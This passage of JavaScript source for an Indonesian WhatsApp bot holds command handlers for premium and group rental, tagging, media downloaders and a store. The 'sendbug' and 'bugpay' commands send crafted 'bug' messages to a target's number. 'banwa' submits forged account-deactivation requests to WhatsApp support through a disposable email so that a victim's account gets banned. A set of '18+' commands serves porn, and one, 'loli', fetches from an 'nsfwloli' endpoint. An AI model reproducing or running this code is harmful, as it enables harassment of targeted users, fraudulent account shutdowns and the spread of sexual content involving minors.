			case "belipremium": { // @tag: main
				// @tag: main
				m.reply(
					`Jika kamu ingin menjadi Member Premium, kamu cukup membayar Rp5.000 untuk 1 Minggu,\n Rp20.000 untuk 1 Bulan\n dan jika ingin menjadi Member Premium Permanen kamu hanya membayar Rp50.000.\n Jika berminat silahkan chat Owner Bot, ketik ${prefix}owner\n\nPembayaran bisa melalui Gopay/Pulsa/Shoopepay/Ovo/Qris`
				);
				break;
			}
case "sendbug": { // @tag: virus
				if (!text) return m.reply("Masukkan nomer tujuan");
				if (!isOwner) return m.reply(mess.owner);
				try {
					var Pe = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
					await conn.sendMessage(
						Pe,
						{
							text: "halo",
						},
						{
							quoted: msg.bugpay,
						}
					);
					conn.sendMessage(
						m.chat,
						{
							text: `Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`,
							mentions: [Pe],
						},
						{
							quoted: msg.fpay,
						}
					);
				} catch (err) {
					console.log(err);
					m.reply("Gagal mengirim bug, Terjadi Error");
				}
			break;
			}
				case "bugpay": { // @tag: virus
				if (!isOwner && !msg.key.fromMe) return;
				if (!text) return ("Masukkan nomer nya");
				let requestPaymentMessage = generateWAMessageFromContent(
					m.chat,
					proto.Message.fromObject({
						requestPaymentMessage: {
							currencyCodeIso4217: "IDR",
							amount1000: "1000",
							extendedTextMessage: {
								text: msg.kon,
							},
						},
					}),
					{
						userJid: msg.kon,
					}
				);
				try {
					var Po = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
				await conn.relayMessage(Po, requestPaymentMessage.message, {
					messageId: requestPaymentMessage.key.id,
				});
				conn.sendMessage(
						m.chat,
						{
							text: `Berhasil mengirim Bug ke Nomer @${Po.split("@")[0]}`,
							mentions: [Po],
						},
						{
							quoted: msg.fpay,
						}
					);
				} catch (err) {
					console.log(err);
					m.reply("Gagal mengirim bug, Terjadi Error");
				}
			break;
			}
			case "banwa": { // @tag: owner
				if (!isPremium)
					return m.reply(`sorry anda sepertinya bukan pemilik bot/Pengguna premium`);
				if (!text) {
					return m.reply("Meki");
				}
try {
		const data = await axios.get("https://www.whatsapp.com/contact/noclient/");
		const email = await axios.get(
			"https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
		);
		const cookie = data.headers["set-cookie"].join("; ");
		const $ = cheerio.load(data.data);
		const $form = $("form");
		const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
		let form = new URLSearchParams();
		form.append("jazoest", $form.find("input[name=jazoest]").val());
		form.append("lsd", $form.find("input[name=lsd]").val());
		form.append("step", "submit");
		form.append("country_selector", "INDONESIA");

		/** @warning
		 * + means it should starts with country code, eg. +62 Xx
		 * miss understanding ?
		 */
	/*	text = PhoneNumber("+" + namar).getNumber("international");
		form.append("phone_number", `${namar}`);*/
		/** */

		form.append("email", email.data[0]);
		form.append("email_confirm", email.data[0]);
		form.append("platform", "ANDROID");
		form.append("your_message", "Perdido/roubado: desative minha conta");
		form.append("__user", "0");
		form.append("__a", "1");
		form.append("__csr", "");
		form.append("__req", "8");
		form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
		form.append("dpr", "1");
		form.append("__ccg", "UNKNOWN");
		form.append("__rev", "1006630858");
		form.append("__comment_req", "0");

		const res = await axios({
			url,
			method: "POST",
			data: form,
			headers: {
				cookie,
			},
		});
		const payload = String(res.data);

		if (payload.includes(`"payload":true`)) {
			m.reply(
				`FROM WhatsApp Support
Hai,
Terima kasih atas pesan Anda.
Kami telah menonaktifkan akun WhatsApp Anda.`.trim()
			);
		} else if (payload.includes(`"payload":false`)) {
			m.reply(
				`Terima kasih telah menghubungi kami.
Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`.trim()
			);
		} else m.reply(await import("utils").format(res.data));
	} catch (err) {
		m.reply(`${err}`);
	}
				break;
			}
			case "addprem": { // @tag: owner
				// @tag: owner
				if (!isOwner)
					return m.reply(`sorry anda sepertinya bukan pemilik bot`);
				let who;
				if (!args[0] || !args[1]) {
					return m.reply(`Example: *${prefix + command}* @tag 1`);
				}
				who = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
				const value = Number(args[1]);
				if (typeof value !== "number") {
					return conn.sendMessage(
						m.chat,
						{
							text: `Jumlah hari harus berupa angka.\nExample: @${args[0].replace(
								/[^0-9]/g,
								""
							)} 1`,
							mentions: [who],
						},
						{ quoted: m }
					);
				}
				if (typeof db.data.users[who] !== "object") {
					return await conn.sendMessage(
						m.chat,
						{
							text: `@${who.replace(
								/[^0-9]/g,
								""
							)} tidak terdaftar di database`,
							mentions: [who],
						},
						{ quoted: m }
					);
				}
				// declare modify database
				let _user = db.data.users[who];
				const _day = 86400000 * value;
				_user.premium = true;
				if (new Date() * 1 < user.premiumTime) {
					_user.premiumTime += _day;
				} else {
					_user.premiumTime = new Date() * 1 + _day;
				}
				const validDate = ms(_user.premiumTime - new Date() * 1);
				return await conn.sendMessage(
					m.chat,
					{
						text: `_Sukses!_

> *User*: @${who.replace(/[^0-9]/g, "")}
> *Days*: ${value} days
> *Countdown:* _${validDate.days}_ days _${validDate.hours}_ hours`,
						mentions: [who],
					},
					{ quoted: m }
				);
				break;
			}
			case "dellprem": { // @tag: owner
				// @tag: owner
				if (!isOwner)
					return m.reply(`sorry anda sepertinya bukan pemilik bot`);
				let who;
				if (!args[0] || !args[1]) {
					return m.reply(`Example: *${prefix + command}* @tag 1`);
				}
				who = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
				const value = Number(args[1]);
				if (typeof value !== "number") {
					return conn.sendMessage(
						m.chat,
						{
							text: `Jumlah hari harus berupa angka.\nExample: *${
								prefix + command
							}* @${args[0].replace(/[^0-9]/g, "")} 1`,
							mentions: [who],
						},
						{ quoted: m }
					);
				}
				if (typeof db.data.users[who] !== "object") {
					return await conn.sendMessage(
						m.chat,
						{
							text: `@${who.replace(
								/[^0-9]/g,
								""
							)} tidak terdaftar di database`,
							mentions: [who],
						},
						{ quoted: m }
					);
				}
				// declare modify database
				let _user = db.data.users[who];
				_user.premium = false;
				_user.premiumTime = -0;
				return await conn.sendMessage(
					m.chat,
					{
						text: `_Sukses!_`,
					},
					{ quoted: m }
				);
				break;
			}
			case "addsewa": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!args[0] || !args[1]) {
					return m.reply(`Example: *${prefix + command}* link_gc days`);
				}
				const linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})( [0-9]{1,3})?/i;
				let [_, code] = args[0].match(linkRegex) || [];
				if (!code) {
					return m.reply("Link invalid!")
				}
				const Jid = await conn.groupAcceptInvite(code).catch(() => false);
				if (!Jid) {
					return m.reply("Failed to join!")
				}
				const value = Number(args[1]);
				if (isNaN(value)) {
					return conn.sendMessage(
						m.chat,
						{
							text: `Jumlah hari harus berupa angka.\nExample: *${
								prefix + command
							}* link_gc 1`,
						},
						{ quoted: m }
					);
				}
				const _day = 86400000 * value;
				let _chat = db.data.chats[Jid];
				if (typeof _chat !== "object") {
					_chat = {}
				}
				if (_chat) {
					structure(conn, {
						m: {
							isGroup: true,
							chat: Jid
						}
					})
				} else {
					_chat = {
						...structure(conn, {
							m: {
								isGroup: true,
								chat: Jid
							}
						}).chat
					}
				}
				_chat.sewa = true;
				if (new Date() * 1 < _chat.sewaTime) {
					_chat.sewaTime += _day;
				} else {
					_chat.sewaTime = new Date() * 1 + _day;
				}
				const validDate = ms(_chat.sewaTime - new Date() * 1);
				return await conn.sendMessage(
					m.chat,
					{
						text: `_Sukses!_

> *Name*: ${await (await conn.groupMetadata(Jid)).subject}
> *Jid*: ${Jid}
> *Days*: ${value} days
> *Countdown:* _${validDate.days}_ days _${validDate.hours}_ hours`,
					},
					{ quoted: m }
				);
				break;
			}
			case "listprem":
			case "listpremium": { // @tag: info
				// @tag: info
				let _text = "List Premium\n\n";
				let isEmpty = true;
				Object.keys(db.data.users).forEach((key) => {
					const _user = db.data.users[key];
					if (_user.premium) {
						const validDate = ms(_user.premiumTime - new Date() * 1);
						_text += `*Tags*: @${key.replace(/[^0-9]/g, "")}
*Days*: ${validDate.days}
*Hour*: ${validDate.hours}
*Minute*: ${validDate.minutes}\n\n`;
						isEmpty = false;
					}
				});
				if (isEmpty) {
					return m.reply("Belum ada user yang premium.");
				}
				conn.sendMessage(
					m.chat,
					{
						text: _text.trim(),
						mentions: [..._text.matchAll(/@([0-9]{5,16}|0)/g)].map(
							(v) => v[1] + "@s.whatsapp.net"
						),
					},
					{ quoted: m }
				);
				break;
			}
			case "listsewa": { // @tag: info
				// @tag: info
				let _text = "List Sewa\n\n";
				let isEmpty = true;
				for (const key of Object.keys(db.data.chats)) {
					const _chat = db.data.chats[key];
					if (_chat.sewa) {
						const validDate = ms(_chat.sewaTime - new Date() * 1);
						_text += `*Jid*: @${key}
*Days*: ${validDate.days}
*Hour*: ${validDate.hours}
*Minute*: ${validDate.minutes}\n\n`;
						isEmpty = false;
					}
				}
				if (isEmpty) {
					return m.reply("Belum ada penyewaan njir");
				}
				await conn.sendMessage(
					m.chat,
					{
						text: _text.trim(),
					},
					{ quoted: m }
				);
				break;
			}
			case "ceksewa": { // @tag: group
				// @tag: group
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!chat.sewa) {
					return m.reply(`Bot tidak di sewa di group ini`);
				}
				const validDate = ms(chat.sewaTime - new Date() * 1);
				m.reply(
					`Exp: ${validDate.days} days ${validDate.hours} hours ${validDate.seconds} seconds`
				);
				break;
			}
			case "hidetag": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				await conn.sendMessage(m.chat, {
					text: text ? text : "P :)",
					mentions: participants
						.map((u) => u.id)
						.filter((v) => v !== conn.user.jid),
				});
				break;
			}
			case "tagall": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				await conn.sendMessage(
					m.chat,
					{
						text:
							`${text ? `Pesan: ${text}\n` : ""}┌─「 Tag All 」\n` +
							participants
								.map((u) => u.id)
								.filter((v) => v !== conn.user.jid)
								.map((v) => "│◦❒ @" + v.replace(/@.+/, "")).join`\n` +
							"\n└────",
						mentions: participants
							.map((u) => u.id)
							.filter((v) => v !== conn.user.jid),
					},
					{ quoted: m }
				);
				break;
			}
			case "tes": { // @tag: info
				// @tag: info
				const startTime = performance.now();
				m.reply(
					`Respon: ${(performance.now() - startTime).toFixed(
						4
					)} _Detik_

- Runtime
Node : ${
Math.round(process.uptime() / (60*60*24)) +
" Hari " +
Math.round(process.uptime() / (60*60) % 24) +
" Jam " +
Math.round(process.uptime() / 60) % 60 +
" Menit"
}
Machine : ${
Math.round(os.uptime() / (60*60*24)) +
" Hari " +
Math.round(os.uptime() / (60*60) % 24) +
" Jam " +
Math.round(os.uptime() / 60) % 60 +
" Menit"
}`
				);
				break;
			}
			case "sider":
			case "listonline": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				const expectedUsers = participants
					.map((u) => u.id)
					.filter((v) => v !== conn.user.jid);
				await delay(5 * 1000)
				const MSG = await conn.sendMessage(m.chat, {
					text: "Sider check....",
					// mentions: expectedUsers,
				});
				setTimeout(async () => {
					const userReceipt = [];
					MSG.userReceipt.forEach((key) => {
						userReceipt.push(key.userJid);
					});
					const notReceiveUsers = expectedUsers.filter((v) =>
						!userReceipt.includes(v)
					);
					console.log(userReceipt, notReceiveUsers)
					if (Array.isArray(notReceiveUsers) && notReceiveUsers.length) {
						conn.sendMessage(
							m.chat,
							{
								text:
									`┌─「 Woi sider 」\n` +
									notReceiveUsers
										.filter((v) => v !== conn.user.jid)
										.map((v) => "│◦❒ @" + v.replace(/@.+/, "")).join`\n` +
									"\n└────",
								mentions: notReceiveUsers,
							},
							{ quoted: MSG }
						);
					} else {
						conn.sendMessage(
							m.chat,
							{
								text: "Anjay gada sider..",
							},
							{ quoted: MSG }
						);
					}
				}, 25 * 1000);
				break;
			}
			case "tiktok":{ // /tag: downloader
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_toktok`);
				}
				m.reply(mess.wait);
				const fatihh = await axios.get(`https://saipulanuar.ga/api/download/tiktok?url=${text}`).then(( { data } ) => data === null || data === void 0 ? void 0 : data).catch((e) => e === null || e === void 0 ? void 0 : e.response) || { result: null }
				const fatih = fatihh?.result;
				conn.sendMessage(
					m.chat,
					{
						video: {
							url: fatih.video,
						},
						caption: `${fatih.description}`,
					},
					{ quoted: m }
				);
				consumeLimit();
                   break;
			}
			case "tiktokmusic": { // @tag: downloader
				// @tag: downloader
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_toktok`);
				}
				m.reply(mess.wait);
				const json = await (
					await fetch(
						API("rose", "/downloader/tiktok", { url: args[0] }, "apikey")
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Yah gaggagaal");
				}
				await conn.sendMessage(
					m.chat,
					{
						audio: {
							url: json.download.music,
						},
						mimetype: "audio/mp4",
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "ytmp4": { // @tag: downloader
				// @tag: downloader
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_yt`);
				}
				m.reply(mess.wait)
				const json = await (
					await fetch(API("rose", "/downloader/yt", { url: args[0] }, "apikey"))
				).json();
				if (!json.status) {
					return m.reply(json.message || "Yah gaggagaal");
				}
				await conn.sendMessage(
					m.chat,
					{
						video: {
							url: json.video.url,
						},
						caption: `Title: ${json.title}\nDuration: ${json.duration}`,
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "ytmp3": { // @tag: downloader
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_yt`);
				}
				m.reply(mess.wait)
				const json = await (
					await fetch(API("rose", "/downloader/yt", { url: args[0] }, "apikey"))
				).json();
				if (!json.status) {
					return m.reply(json.message || "Yah gaggagaal");
				}
				await conn.sendMessage(
					m.chat,
					{
						audio: {
							url: json.audio.url,
						},
						mimetype: "audio/mp4",
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "loli": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const lolay = await fetch('https://saipulanuar.ga/api/nsfwloli')
				conn.sendMessage(m.chat, { image : lolay, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
						{
							buttonId: ".loli",
							buttonText: { displayText: "LAGI" },
							type: 1,
						}
					],*/
				},
				{ quoted : m }
				);
				break;
			}
			case "femdom": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/femdom?apikey=danzz')
				conn.sendMessage(m.chat, {
					image : {
					url: hntai.result.url
					},
					caption : 'nih kak',
					/*footer: `sange ya kak`,
					buttons: [
						{
							buttonId: ".femdom",
							buttonText: { displayText: "LAGI" },
							type: 1,
						}
					],*/
				},
				{ quoted : m }
				);
				break;
			}
			case "ero": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/ero?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".ero",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "cum": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/cum?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".cum",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "blowjob": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/blowjob?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".blowjob",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "bdsm": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/bdsm?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".bdsm",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "ahegao": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/ahegao?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".ahegao",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "jahy": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/jahy?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".jahy",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "yuri": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/yuri?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".yuri",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "cuckold": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/cuckold?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".cuckold",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "foot": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/foot?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".foot",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "panties": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/panties?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".panties",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "orgy": { // @tag: 18+
				// @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/orgy?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".orgy",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "hentai": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const hntai = await fetchJson('https://api-danzz.xyz/api/nsfw/hentai?apikey=danzz')
				conn.sendMessage(m.chat, { image : { url: hntai.result.url }, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".hentai",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "bkp": { // @tag: 18+
				if (m.isGroup) {
						return m.reply('Private Only');
					}
				if (!isPremium) {
						return m.reply(mess.premium)
					}
				m.reply(mess.wait)
				const bkp = await fetch('https://saipulanuar.ga/api/bokepig')
				conn.sendMessage(m.chat, { image : bkp, caption : 'nih kak',
				/*footer: `sange ya kak`,
				buttons: [
							{
								buttonId: ".bkp",
								buttonText: { displayText: "LAGI" },
								type: 1,
							}
						],*/
				},
						{ quoted : m }
				);
				break;
			}
			case "ytsearch":
			case "play": { // @tag: searching
				// @tag: searching
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* rose gone`);
				}
				const json = await (
					await fetch(
						API("rose", "/searching/ytsearch", { query: text }, "apikey")
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Pencarian tidak ditemukan");
				}
				const sections = [];
				json.result.video.forEach((v) => {
					sections.push({
						title: v.title,
						rows: [
							{
								title: "Video 🎥",
								rowId: `${prefix}ytmp4 ${v.url}`,
								description: `download ${v.title} (${v.url})`,
							},
							{
								title: "Audio 🎧",
								rowId: `${prefix}ytmp3 ${v.url}`,
								description: `download ${v.title} (${v.url})`,
							},
						],
					});
				});
				const listMessage = {
					text: Config.footer,
					footer: `Hasil Pencarian ${text}`,
					buttonText: "Click here",
					sections,
				};
				await conn.sendMessage(m.chat, listMessage, { quoted: m });
				break;
			}
			case "brainly": { // @tag: searching
				if (!text) return m.reply("Soalnya apa");
				const { data: Brain } = await brainly(text).catch(() => false);
				if (!Brain) {
					return m.reply("Pertanyaan tidak bisa dijawab.")
				}
				let _text = "<──────────────────>️";
				for (const key of Brain) {
					_text += `
*「 _BRAINLY_ 」*


*➸ Pertanyaan:* ${key.pertanyaan}
*➸ Jawaban:* ${key.jawaban[0].text}

<──────────────────>
`
				}
				m.reply(_text.trim())
				consumeLimit();
				break;
			}
			case "pinterest": { // @tag: searching
				// @tag: searching
				if (!text) {
					return m.reply(`Example: *${prefix + command}* rose blackpink`);
				}
				m.reply(mess.wait)
				const json = await (
					await fetch(
						API("rose", "/searching/pinterest", { query: text }, "apikey")
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Pencarian gagal");
				}
				await conn.sendMessage(
					m.chat,
					{
						image: {
							url: json.result[Math.floor(Math.random() * json.result.length)],
						},
						caption: `Query: ${text}`,
					},
					{ quoted: m }
				);
				break;
			}
			case "welcome": { // @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`);
				}
				const input = args[0].toLowerCase();
				if (input === "on" || input === "off") {
					chat.welcome = input === "on" ? true : false;
					m.reply(
						`Welcome Berhasil ${
							input === "on" ? "*Diaktifkan*" : "*Dimatikan*"
						}`
					);
				}
				break;
			}
			case "resetwelcome": {// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				chat.sWelcome = ""
				m.reply(`Sukses!`);
				break
			}
			case "setwelcome": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!text) {
					return m.reply(
						`Example: *${
							prefix + command
						}* Welcome @user di @subject\n@desc\n\n`
					);
				}
				chat.sWelcome = text;
				m.reply(`Sukses!`);
				break;
			}
			case "setleft": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!text) {
					return m.reply(
						`Example: *${
							prefix + command
						}* goodbye @user di @subject\n@desc\n\n`
					);
				}
				chat.sLeft = text;
				m.reply(`Sukses!`);
				break;
			}
			case "afk": { // @tag: group
				// @tag: group
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (user.afk) {
					return m.reply("Kamu sudah afk sebelumnya!");
				}
				const reason = text ? text : "Tanpa alasan";
				user.afk = true;
				user.afkReason = reason;
				conn.sendMessage(
					m.chat,
					{
						text: `@${m.sender.replace(
							/[^0-9]/g,
							""
						)} sekarang afk\n\nAlasan: ${reason}`,
						mentions: [m.sender],
					},
					{ quoted: m }
				);
				break;
			}
			case "linkgroup":
			case "linkgc": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				const uriCode = await conn.groupInviteCode(m.chat);
				m.reply(`https://chat.whatsapp.com/${uriCode}`);
				break;
			}
			case "setprofilegroup": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (!/image/i.test(mime)) {
					return m.reply(
						`Reply/kirim gambar dengan caption *${prefix + command}*`
					);
				}
				let image = await q.download();
				if (args[0] === "panjang") {
					image = await conn.generateProfilePicture(image);
					await conn.query({
						tag: "iq",
						attrs: {
							to: m.chat,
							type: "set",
							xmlns: "w:profile:picture",
						},
						content: [
							{
								tag: "picture",
								attrs: { type: "image" },
								content: image,
							},
						],
					});
				} else {
					await conn.updateProfilePicture(m.chat, { url: image });
				}
				m.reply(`Sukses`);
				break;
			}
			case "setrpg": { // @tag: owner
				// @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`);
				}
				const input = args[0].toLowerCase();
				if (input === "on" || input === "off") {
					settings.rpg["enable"] = input === "on" ? true : false;
					m.reply(
						`Rpg Berhasil ${input === "on" ? "Diaktifkan" : "Dimatikan"}`
					);
				}
				break;
			}
			case "listproduk":
			case "jualan":
			case "toko": { // @tag: store
				// @tag: store
				if (m.isGroup) {
					return m.reply(`Silahkan gunakan ${prefix + command} di private chat untuk nge cek harga`)
				}
				// pass arguments here
				const [_arg1, _arg_2] = text.split("|");
				if (!_arg1 && !_arg_2) {
					const listP = {};
					const listSections = [];
					const _p = await ampangPedia.prepaid.services();
					// LOLL
					_p.data.forEach((v) => {
						Object.assign(listP, {
							[v.type]: v.type,
						});
					});
					Object.keys(listP).sort().forEach((key) => {
						listSections.push({
							title: listP[key],
							rowId: `${prefix + command} ${listP[key]}`,
						});
					});
					const listMessage = {
						text: "Berikut daftar produk",
						footer: "Jika sudah menemukan yg ingin di pesan, silahkan chat owner untuk melanjutkan transaksi",
						title: "List Product",
						buttonText: "Choose",
						sections: [
							{
								title: "List",
								rows: listSections,
							},
						],
					};
					return await conn.sendMessage(m.chat, listMessage);
				}
				if (_arg1 && !_arg_2) {
					const listP = {};
					const listSections = [];
					let _p = await ampangPedia.prepaid.services(_arg1);
					if (_p.result) {
						_p = _p.data.filter((item) => item.type === _arg1);
						_p.forEach((v) => {
							Object.assign(listP, {
								[v.brand]: v.brand,
							});
						});
						Object.keys(listP).sort().forEach((key) => {
							listSections.push({
								title: listP[key],
								rowId: `${prefix + command} ${_arg1}|${listP[key]}`,
							});
						});
						const listMessage = {
							text: "Berikut daftar produk " + _arg1,
							footer: Config.footer,
							title: "List Product",
							buttonText: "Choose",
							sections: [
								{
									title: "List",
									rows: listSections,
								},
							],
						};
						return await conn.sendMessage(m.chat, listMessage);
					}
				}
				if (_arg1 && _arg_2) {
					let _p = await ampangPedia.prepaid.services(_arg1, _arg_2);
					_p = _p.data.filter(
						(item) => item.type === _arg1 && item.brand === _arg_2
					);
					let _text = "Berikut daftar produk \n\n";
					for (const i of _p.sort((a, b) => a.price - b.price).filter((v) => v.status == "available")) {
						_text += `*Code* : ${i.code}
*Nama* : ${i.name}
